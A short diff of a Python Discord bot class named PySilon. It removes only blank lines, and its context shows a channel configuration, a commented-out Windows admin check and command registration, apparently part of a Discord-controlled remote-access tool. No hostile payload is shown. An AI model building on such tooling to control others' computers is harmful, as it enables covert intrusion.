@@ -21,12 +21,6 @@ guild_ids = []
 channel_ids = {'main': True, 'spam': True, 'live': False, 'vrec': False}
 #end_configuration
 
-
-
-
-
-
-
 class PySilon(commands.Bot):
     def __init__(self, command_prefix, self_bot) -> None:
         #def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
@@ -97,7 +91,6 @@ class PySilon(commands.Bot):
     async def on_ready(self):
         await self.get_channel(self.channel_id).send('Bot is ready')
         await self.first_run_check()
-        
 
     def load_commands(self):
         @self.command(name="server", pass_context=True)
